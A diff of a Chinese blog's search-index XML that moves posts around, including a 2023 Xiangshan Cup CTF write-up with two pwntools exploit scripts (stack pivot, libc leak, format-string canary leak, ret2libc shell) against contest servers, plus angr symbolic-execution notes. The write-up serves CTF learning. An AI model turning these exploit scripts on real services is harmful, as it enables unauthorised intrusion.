@@ -223,43 +223,6 @@ Sandbox环境与安装(暂时弃用，勿看)</h1>
       </tags>
   </entry>
   <entry>
-    <title>2023香山杯Pwn &amp; RE-wp</title>
-    <url>/2023/10/15/blog12/</url>
-    <content><![CDATA[<blockquote class="blockquote-center">
-香山杯！Pwn ak + RE 差几分钟就xxTEA写完啦😭
-</blockquote>
-<span id="more"></span>
-<h1 id="re">RE</h1>
-<h3 id="url从哪儿来">url从哪儿来</h3>
-<p><img src="/pic/image-1.png" /></p>
-<p>断点下在这，知道他会在buffer指向的地址生成一个文件，让程序跑完，能看到这个文件
-<img src="/pic/image-2.png" />
-ida打开，因为它问url是什么，所以我们直接看szurl <img
-src="/pic/image-3.png" />
-结果这个不是flag，看到url问我们是如何解密的，所以我们回到上面那一堆数据里面，我们看一下v13
-<img src="/pic/image-4.png" /> flag就在这 <img
-src="/pic/image-5.png" /></p>
-<h1 id="pwn">Pwn</h1>
-<h3 id="move">Move</h3>
-<p>栈迁移到bss段的skdd，泄露puts，libcsearcher查到puts的libc是2.27，glibc-all-in-one下一个出来，然后返回main函数<br />
-在skdd里写system("/bin/sh")，本来是想再栈迁移一遍，结果发现直接do_system了，稍微修改了一下就getshell了
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># exp头 ---------------------------------------------------------------</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">domain_name = &#x27;59.110.125.41&#x27;</span><br><span class="line">port = 45341</span><br><span class="line">file = &#x27;./pwn&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(domain_name,port)</span><br><span class="line"># io = process(file)</span><br><span class="line"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc-2.27.so&#x27;)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">payloadload = b&#x27;\x78\x56\x34\x12&#x27;</span><br><span class="line">bss_addr = 0x4050A0</span><br><span class="line">lea_addr = 0x4012E0</span><br><span class="line">junk = 0x30</span><br><span class="line">pop_rdi = 0x401353</span><br><span class="line">start_addr = 0x401264</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">bss_payloadload = p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(start_addr)</span><br><span class="line">io.sendafter(&#x27;again!\n&#x27;,bss_payloadload)</span><br><span class="line">io.sendafter(&#x27;number&#x27;,payloadload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 栈劫持 ---------------------------------------------------------------</span><br><span class="line">payloadload = b&#x27;a&#x27;*junk + p64(bss_addr-8) + p64(lea_addr)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.send(payloadload)</span><br><span class="line">puts_addr = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(&#x27;puts_addr   ---&gt;   &#x27;,hex(puts_addr))</span><br><span class="line"># libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)</span><br><span class="line"># libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)</span><br><span class="line"># sys_addr  = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">libc_base = puts_addr - libc.sym[&#x27;puts&#x27;]</span><br><span class="line">sys_addr  = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="line">bin_sh    = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class="line">print(&#x27;libc_base   ---&gt;   &#x27;,hex(libc_base))</span><br><span class="line">print(&#x27;sys_addr    ---&gt;   &#x27;,hex(sys_addr))</span><br><span class="line"># bin_sh    = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line"># sh_addr = 0x402027</span><br><span class="line">ret_addr = 0x40101a</span><br><span class="line">bss_payloadload = p64(pop_rdi) + p64(bin_sh) + p64(sys_addr)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.sendafter(&#x27;again!\n&#x27;,bss_payloadload)</span><br><span class="line"># payloadload = b&#x27;\x78\x56\x34\x12&#x27;</span><br><span class="line"># io.sendafter(&#x27;number&#x27;,payloadload)</span><br><span class="line"></span><br><span class="line"># payloadload = b&#x27;a&#x27;*junk + p64(bss_addr-8) + p64(lea_addr)</span><br><span class="line"># io.send(payloadload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">0x000000000040134c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040134e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000401350 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000401352 : pop r15 ; ret</span><br><span class="line">0x000000000040134b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040134f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040119d : pop rbp ; ret</span><br><span class="line">0x0000000000401353 : pop rdi ; ret</span><br><span class="line">0x0000000000401351 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x000000000040134d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040101a : ret</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure></p>
-<h3 id="pwthon">Pwthon</h3>
-<p>Cpython pwn<br />
-核心逻辑在.so文件里，盲打试到有格式化字符串，测试出栈大小，泄露出必要的信息就能ret2libc了<br />
-gift泄露基地址和返回地址<br />
-格式化字符串泄露canary<br />
-通过puts泄露libc ret2libc <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">domain_name = &#x27;39.106.48.123&#x27;</span><br><span class="line">port = 29572</span><br><span class="line"># file = &#x27;./pwn&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(domain_name,port)</span><br><span class="line"># io = process(file)</span><br><span class="line"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span><br><span class="line"></span><br><span class="line"># elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line"># libc = ELF(&#x27;.bc-2.27.so&#x27;)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&#x27;&gt;&#x27;,b&#x27;0&#x27;)</span><br><span class="line">io.recvuntil(b&#x27;gift&#x27;)</span><br><span class="line">gift = int(io.recvuntil(&#x27;\n&#x27;),16)</span><br><span class="line">base = gift- 0x68B0</span><br><span class="line">print(&#x27;base&#x27;,base)</span><br><span class="line"></span><br><span class="line">print(&#x27;gift&#x27;,gift)</span><br><span class="line">io.sendline(b&#x27;%p-&#x27;*31+b&#x27;q%pq&#x27;)</span><br><span class="line">io.recvuntil(b&#x27;q&#x27;)</span><br><span class="line">canary = int(io.recvuntil(b&#x27;q&#x27;,drop=&#x27;Ture&#x27;),16)</span><br><span class="line">print(&#x27;canary&#x27;,canary)</span><br><span class="line">#io.recvuntil(&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line">pop_rdi = 0x0000000000003f8f + base</span><br><span class="line">pop_rsi = 0x0000000000003cd9 + base</span><br><span class="line">bss = 0x016FC0+0x100+base</span><br><span class="line">read = 0x3940+base</span><br><span class="line">write = 0x03760+base</span><br><span class="line">op = 0x3AE0+base</span><br><span class="line">flag = 0x000000000003c257+base</span><br><span class="line">puts = 0x3710+base</span><br><span class="line">ret = 0x000000000000301a+base</span><br><span class="line"></span><br><span class="line">#payload = p64(0)*0x16+p64(canary)+p64(gift)</span><br><span class="line">payload = p64(0)*33+p64(canary)*2+p64(pop_rdi)+p64(0x16078+base)+p64(puts)+p64(base+0x99f0)</span><br><span class="line">#payload = b&#x27;a&#x27;</span><br><span class="line">io.send(b&#x27;&#x27;)</span><br><span class="line">print(&quot;len &quot;,len(payload))</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">libc=LibcSearcher(&#x27;puts&#x27;,puts_addr)</span><br><span class="line">offset=puts_addr-libc.dump(&#x27;puts&#x27;)</span><br><span class="line">binsh=offset+libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line">system=offset+libc.dump(&#x27;system&#x27;)</span><br><span class="line"></span><br><span class="line">payload2 = p64(0)*32+p64(canary)*3+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)</span><br><span class="line">io.sendline(b&#x27;a&#x27;)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p>
-<p><img src="http://localhost:4000/pic/imagexsb.png" /></p>
-]]></content>
-      <categories>
-        <category>WP</category>
-      </categories>
-      <tags>
-        <tag>WriteUp</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Symbolic Execution Leaning Note (2) -- Angr_2023</title>
     <url>/2023/10/20/blog13/</url>
     <content><![CDATA[<blockquote class="blockquote-center">
@@ -337,6 +300,199 @@ Explosion，有些地方也叫路径爆炸)的问题，来看下面这个循环
 </ul>
 <h1 id="x02-my-manual-for-angr">0x02 My Manual for Angr</h1>
 <p><a href=""></a></p>
+]]></content>
+      <categories>
+        <category>Pwn</category>
+      </categories>
+      <tags>
+        <tag>SymbolicExecution</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2023香山杯Pwn &amp; RE-wp</title>
+    <url>/2023/10/15/blog12/</url>
+    <content><![CDATA[<blockquote class="blockquote-center">
+香山杯！Pwn ak + RE 差几分钟就xxTEA写完啦😭
+</blockquote>
+<span id="more"></span>
+<h1 id="re">RE</h1>
+<h3 id="url从哪儿来">url从哪儿来</h3>
+<p><img src="/pic/image-1.png" /></p>
+<p>断点下在这，知道他会在buffer指向的地址生成一个文件，让程序跑完，能看到这个文件
+<img src="/pic/image-2.png" />
+ida打开，因为它问url是什么，所以我们直接看szurl <img
+src="/pic/image-3.png" />
+结果这个不是flag，看到url问我们是如何解密的，所以我们回到上面那一堆数据里面，我们看一下v13
+<img src="/pic/image-4.png" /> flag就在这 <img
+src="/pic/image-5.png" /></p>
+<h1 id="pwn">Pwn</h1>
+<h3 id="move">Move</h3>
+<p>栈迁移到bss段的skdd，泄露puts，libcsearcher查到puts的libc是2.27，glibc-all-in-one下一个出来，然后返回main函数<br />
+在skdd里写system("/bin/sh")，本来是想再栈迁移一遍，结果发现直接do_system了，稍微修改了一下就getshell了
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># exp头 ---------------------------------------------------------------</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">domain_name = &#x27;59.110.125.41&#x27;</span><br><span class="line">port = 45341</span><br><span class="line">file = &#x27;./pwn&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(domain_name,port)</span><br><span class="line"># io = process(file)</span><br><span class="line"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc-2.27.so&#x27;)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">payloadload = b&#x27;\x78\x56\x34\x12&#x27;</span><br><span class="line">bss_addr = 0x4050A0</span><br><span class="line">lea_addr = 0x4012E0</span><br><span class="line">junk = 0x30</span><br><span class="line">pop_rdi = 0x401353</span><br><span class="line">start_addr = 0x401264</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">bss_payloadload = p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(start_addr)</span><br><span class="line">io.sendafter(&#x27;again!\n&#x27;,bss_payloadload)</span><br><span class="line">io.sendafter(&#x27;number&#x27;,payloadload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 栈劫持 ---------------------------------------------------------------</span><br><span class="line">payloadload = b&#x27;a&#x27;*junk + p64(bss_addr-8) + p64(lea_addr)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.send(payloadload)</span><br><span class="line">puts_addr = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(&#x27;puts_addr   ---&gt;   &#x27;,hex(puts_addr))</span><br><span class="line"># libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)</span><br><span class="line"># libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)</span><br><span class="line"># sys_addr  = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">libc_base = puts_addr - libc.sym[&#x27;puts&#x27;]</span><br><span class="line">sys_addr  = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="line">bin_sh    = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class="line">print(&#x27;libc_base   ---&gt;   &#x27;,hex(libc_base))</span><br><span class="line">print(&#x27;sys_addr    ---&gt;   &#x27;,hex(sys_addr))</span><br><span class="line"># bin_sh    = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line"># sh_addr = 0x402027</span><br><span class="line">ret_addr = 0x40101a</span><br><span class="line">bss_payloadload = p64(pop_rdi) + p64(bin_sh) + p64(sys_addr)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.sendafter(&#x27;again!\n&#x27;,bss_payloadload)</span><br><span class="line"># payloadload = b&#x27;\x78\x56\x34\x12&#x27;</span><br><span class="line"># io.sendafter(&#x27;number&#x27;,payloadload)</span><br><span class="line"></span><br><span class="line"># payloadload = b&#x27;a&#x27;*junk + p64(bss_addr-8) + p64(lea_addr)</span><br><span class="line"># io.send(payloadload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">0x000000000040134c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040134e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000401350 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000401352 : pop r15 ; ret</span><br><span class="line">0x000000000040134b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040134f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040119d : pop rbp ; ret</span><br><span class="line">0x0000000000401353 : pop rdi ; ret</span><br><span class="line">0x0000000000401351 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x000000000040134d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040101a : ret</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure></p>
+<h3 id="pwthon">Pwthon</h3>
+<p>Cpython pwn<br />
+核心逻辑在.so文件里，盲打试到有格式化字符串，测试出栈大小，泄露出必要的信息就能ret2libc了<br />
+gift泄露基地址和返回地址<br />
+格式化字符串泄露canary<br />
+通过puts泄露libc ret2libc <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">domain_name = &#x27;39.106.48.123&#x27;</span><br><span class="line">port = 29572</span><br><span class="line"># file = &#x27;./pwn&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(domain_name,port)</span><br><span class="line"># io = process(file)</span><br><span class="line"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span><br><span class="line"></span><br><span class="line"># elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line"># libc = ELF(&#x27;.bc-2.27.so&#x27;)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&#x27;&gt;&#x27;,b&#x27;0&#x27;)</span><br><span class="line">io.recvuntil(b&#x27;gift&#x27;)</span><br><span class="line">gift = int(io.recvuntil(&#x27;\n&#x27;),16)</span><br><span class="line">base = gift- 0x68B0</span><br><span class="line">print(&#x27;base&#x27;,base)</span><br><span class="line"></span><br><span class="line">print(&#x27;gift&#x27;,gift)</span><br><span class="line">io.sendline(b&#x27;%p-&#x27;*31+b&#x27;q%pq&#x27;)</span><br><span class="line">io.recvuntil(b&#x27;q&#x27;)</span><br><span class="line">canary = int(io.recvuntil(b&#x27;q&#x27;,drop=&#x27;Ture&#x27;),16)</span><br><span class="line">print(&#x27;canary&#x27;,canary)</span><br><span class="line">#io.recvuntil(&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line">pop_rdi = 0x0000000000003f8f + base</span><br><span class="line">pop_rsi = 0x0000000000003cd9 + base</span><br><span class="line">bss = 0x016FC0+0x100+base</span><br><span class="line">read = 0x3940+base</span><br><span class="line">write = 0x03760+base</span><br><span class="line">op = 0x3AE0+base</span><br><span class="line">flag = 0x000000000003c257+base</span><br><span class="line">puts = 0x3710+base</span><br><span class="line">ret = 0x000000000000301a+base</span><br><span class="line"></span><br><span class="line">#payload = p64(0)*0x16+p64(canary)+p64(gift)</span><br><span class="line">payload = p64(0)*33+p64(canary)*2+p64(pop_rdi)+p64(0x16078+base)+p64(puts)+p64(base+0x99f0)</span><br><span class="line">#payload = b&#x27;a&#x27;</span><br><span class="line">io.send(b&#x27;&#x27;)</span><br><span class="line">print(&quot;len &quot;,len(payload))</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">libc=LibcSearcher(&#x27;puts&#x27;,puts_addr)</span><br><span class="line">offset=puts_addr-libc.dump(&#x27;puts&#x27;)</span><br><span class="line">binsh=offset+libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line">system=offset+libc.dump(&#x27;system&#x27;)</span><br><span class="line"></span><br><span class="line">payload2 = p64(0)*32+p64(canary)*3+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)</span><br><span class="line">io.sendline(b&#x27;a&#x27;)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://localhost:4000/pic/imagexsb.png" /></p>
+]]></content>
+      <categories>
+        <category>WP</category>
+      </categories>
+      <tags>
+        <tag>WriteUp</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Symbolic Execution Leaning Note (3) -- Angr_API</title>
+    <url>/2023/10/20/blog14/</url>
+    <content><![CDATA[<blockquote class="blockquote-center">
+迈向自动化的第三步——
+</blockquote>
+<span id="more"></span>
+<h1 id="x01-库架构分析">0x01 库架构分析</h1>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">angr</span><br><span class="line"> | - Project()</span><br><span class="line">		 | - factory</span><br><span class="line">				 | - state</span><br><span class="line">					   | - entry_state()</span><br><span class="line">					   | - blank_state(addr)</span><br><span class="line"></span><br><span class="line">					   | - regs.eax/ebx/...</span><br><span class="line">					   | - solver</span><br><span class="line">							  | - BVS</span><br><span class="line">							  | - eval</span><br><span class="line">					   | - fs</span><br><span class="line">						    | - insert(string filename,angr.storage.SimFile())</span><br><span class="line">				 | - simulation_manager(init_state)</span><br><span class="line">						 | - explore(find,avoid)</span><br><span class="line">						 | - found[]</span><br><span class="line"></span><br><span class="line"> | - storage</span><br><span class="line">		 | - SimFile(filename,content,size)</span><br><span class="line"> | - sim_options</span><br><span class="line">		 | - SYMBOL_FILL_UNCONSTRAINED_MEMORY</span><br><span class="line">		 | - SYMBOL_FILL_UNCONSTRAINED_REGISTERS</span><br><span class="line"></span><br><span class="line">found_state</span><br><span class="line">	 | - posix</span><br><span class="line">		   | - dumps(std)</span><br><span class="line">	 | - solver</span><br><span class="line">		   | - eval(claripy.BVS pass,cast_to)</span><br></pre></td></tr></table></figure>
+<h1 id="x02-api手册">0x02 API手册</h1>
+<ul>
+<li><strong>Project类(参数、功能、重载、返回值)</strong>
+<ol type="1">
+<li>构造函数参数：“命令行中运行程序的指令”(eg: "./00_angr_find")</li>
+<li>功能：“构建一个符号执行项目”</li>
+<li>附属成员
+<ul>
+<li><strong>factory</strong>
+<ol type="1">
+<li>附属成员
+<ul>
+<li><strong>state</strong>
+<ol type="1">
+<li>重载函数
+<ul>
+<li><strong>entry_state()</strong>
+<ol type="1">
+<li>返回值：程序入口点</li>
+</ol></li>
+<li><strong>blank_state(addr)</strong>
+<ol type="1">
+<li>参数：模拟执行开始的地址</li>
+</ol></li>
+</ul></li>
+<li>附属成员
+<ul>
+<li><strong>regs</strong>
+<ol type="1">
+<li>附属成员: 各种寄存器</li>
+</ol></li>
+<li><strong>fs</strong>
+<ol type="1">
+<li>全称: filesystem</li>
+<li>附属成员：
+<ul>
+<li><strong>insert(string filename,angr.storage.simFile)</strong>
+<ol type="1">
+<li>参数1：文件名称</li>
+<li>参数2：创建过的符号化文件对象</li>
+</ol></li>
+</ul></li>
+</ol></li>
+</ul></li>
+</ol></li>
+<li><strong>simulation_manager类</strong>
+<ol type="1">
+<li>构造函数参数：起始状态</li>
+<li>功能：设置模拟执行的起始地址，并返回实例化对象</li>
+<li>附属成员
+<ul>
+<li><strong>explore(find, avoid)</strong>
+<ol type="1">
+<li>参数find：希望程序抵达的地址</li>
+<li>参数avoid：希望程序不抵达的地址</li>
+<li>功能：用符号探索到find指向的地址，并避免avoid指向的地址</li>
+<li>重载：explore(find=func1,avoid=func2) <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def func1(state):</span><br><span class="line">	return b&quot;Good Job!&quot; in state.posix.dumps(1)</span><br><span class="line">def func2(state):</span><br><span class="line">	return b&quot;Try Again!&quot; in state.posix.dumps(1)</span><br></pre></td></tr></table></figure>
+<ol type="1">
+<li>功能：探索具有func1特征的的函数分支，回避具有func2特征的函数分支</li>
+</ol></li>
+</ol></li>
+<li><strong>found数组</strong>
+<ol type="1">
+<li>found_state的实例化数组</li>
+</ol></li>
+</ul></li>
+</ol></li>
+</ul></li>
+</ol></li>
+</ul></li>
+</ol></li>
+<li><strong>found_state类</strong>
+<ul>
+<li><strong>posix</strong>
+<ul>
+<li><strong>dumps(int std)</strong>
+<ol type="1">
+<li>参数std: stdin(0)/stdout(1)/stderr(2)</li>
+<li>功能: 将std指向的内容打印出来</li>
+</ol></li>
+</ul></li>
+<li>solver
+<ul>
+<li>eval(claripy.BVS arg1)
+<ol type="1">
+<li>参数：要求解的约束公式</li>
+<li>功能：求解arg1并返回结果</li>
+</ol></li>
+</ul></li>
+</ul></li>
+<li><strong>claripy类</strong>
+<ul>
+<li><strong>BVS类</strong>
+<ol type="1">
+<li>构造函数参数：arg1: 别名 | arg2: 符号向量占多少位</li>
+<li>功能：构建一个空的约束公示</li>
+</ol></li>
+</ul></li>
+<li><strong>storage类</strong>
+<ul>
+<li>SimFile(filename,content,size)
+<ol type="1">
+<li>参数filename：要引入的filename</li>
+<li>参数content：符号化向量</li>
+<li>参数size：要从文件中读取的字节数*8（单位：bits）</li>
+<li>功能：创建一个符号化的文件对象</li>
+</ol></li>
+</ul></li>
+<li><strong>sim_options类</strong>
+<ul>
+<li>SYMBOL_FILL_UNCONSTRAINED_MEMORY
+<ul>
+<li>功能：自动用符号填充未约束的内存（模拟过程中没有明确值的内存位置）</li>
+</ul></li>
+<li>SYMBOL_FILL_UNCONSTRAINED_REGISTERS
+<ul>
+<li>功能：自动用符号填充未约束的寄存器</li>
+</ul></li>
+</ul></li>
+</ul>
+<h1 id="x01-angr语法">0x01 Angr语法</h1>
+<h3 id="准备阶段">1. 准备阶段</h3>
+<ul>
+<li><p><strong>引入与初始化</strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import angr</span><br><span class="line"></span><br><span class="line">p = angr.Project(exec_path)</span><br><span class="line"></span><br><span class="line">init_state = p.factory.entry_state()</span><br><span class="line"># init_state = p.factory.blank_state(addr) # addr = 0xbeef</span><br><span class="line"></span><br><span class="line">sm = p.factory.simulation_manager(init_state)</span><br></pre></td></tr></table></figure></p></li>
+<li><p><strong>命令行引入参数</strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line"></span><br><span class="line">def main(argv):</span><br><span class="line">	arg1 = argv[1]</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">	main(sys.argv)</span><br></pre></td></tr></table></figure></p></li>
+<li><p><strong>符号向量</strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import claripy</span><br><span class="line"></span><br><span class="line">pass1 = claripy.BVS(&#x27;pass1&#x27;, 32)</span><br></pre></td></tr></table></figure></p></li>
+<li><p><strong>符号化寄存器</strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">init_state.regs.eax = pass1</span><br></pre></td></tr></table></figure></p></li>
+<li><p><strong>符号化文件</strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename = &quot;&quot;</span><br><span class="line">filesize = </span><br><span class="line"></span><br><span class="line">password = init_state.solver.BVS(&#x27;password&#x27;,filesize*8)</span><br><span class="line">sim_file = angr.storage.SimFile(filename,content=password,size=filesize)</span><br><span class="line"></span><br><span class="line">init_state.fs.insert(sim_file)</span><br></pre></td></tr></table></figure></p></li>
+</ul>
+<h3 id="探索阶段">2. 探索阶段</h3>
+<ul>
+<li><p><strong>探索指定地址并查看标准流</strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sm.explore(find = addr_to_find)</span><br></pre></td></tr></table></figure></p></li>
+<li><p><strong>利用函数explore分支</strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def is_good(state):</span><br><span class="line">	return b&quot;Good Job!&quot; in state.posix.dumps(1)</span><br><span class="line"></span><br><span class="line">def is_bad(state):</span><br><span class="line">	return b&quot;Try Again!&quot; in state.posix.dumps(1)</span><br><span class="line"></span><br><span class="line">sm.explore(find=is_good, avoid=is_bad)</span><br><span class="line"># sm.explore(find=addr_find, avoid=addr_avoid)</span><br></pre></td></tr></table></figure></p></li>
+</ul>
+<h3 id="输出阶段">3. 输出阶段</h3>
+<ul>
+<li><p><strong>查看结果</strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if sm.found:</span><br><span class="line">	found_state = sm.found[0]</span><br><span class="line">	</span><br><span class="line">	print(&#x27;[x] Solution: &#123;&#125;&#x27;.format(found_state.posix.dumps(0)))</span><br></pre></td></tr></table></figure></p></li>
+<li><p><strong>求解寄存器的符号向量</strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">result = init_state.solver.eval(BVS)</span><br></pre></td></tr></table></figure></p></li>
+</ul>
 ]]></content>
       <categories>
         <category>Pwn</category>
@@ -519,159 +675,84 @@ href="https://blog.csdn.net/duanxingheng/article/details/11730617">OpenSSL-AES</
       </tags>
   </entry>
   <entry>
-    <title>Symbolic Execution Leaning Note (3) -- Angr_API</title>
-    <url>/2023/10/20/blog14/</url>
+    <title>Pwn-格式化字符串汇总</title>
+    <url>/2024/01/21/blog19/</url>
     <content><![CDATA[<blockquote class="blockquote-center">
-迈向自动化的第三步——
+总结一下格式化字符串漏洞，便于后续使用
 </blockquote>
 <span id="more"></span>
-<h1 id="x01-库架构分析">0x01 库架构分析</h1>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">angr</span><br><span class="line"> | - Project()</span><br><span class="line">		 | - factory</span><br><span class="line">				 | - state</span><br><span class="line">					   | - entry_state()</span><br><span class="line">					   | - blank_state(addr)</span><br><span class="line"></span><br><span class="line">					   | - regs.eax/ebx/...</span><br><span class="line">					   | - solver</span><br><span class="line">							  | - BVS</span><br><span class="line">							  | - eval</span><br><span class="line">					   | - fs</span><br><span class="line">						    | - insert(string filename,angr.storage.SimFile())</span><br><span class="line">				 | - simulation_manager(init_state)</span><br><span class="line">						 | - explore(find,avoid)</span><br><span class="line">						 | - found[]</span><br><span class="line"></span><br><span class="line"> | - storage</span><br><span class="line">		 | - SimFile(filename,content,size)</span><br><span class="line"> | - sim_options</span><br><span class="line">		 | - SYMBOL_FILL_UNCONSTRAINED_MEMORY</span><br><span class="line">		 | - SYMBOL_FILL_UNCONSTRAINED_REGISTERS</span><br><span class="line"></span><br><span class="line">found_state</span><br><span class="line">	 | - posix</span><br><span class="line">		   | - 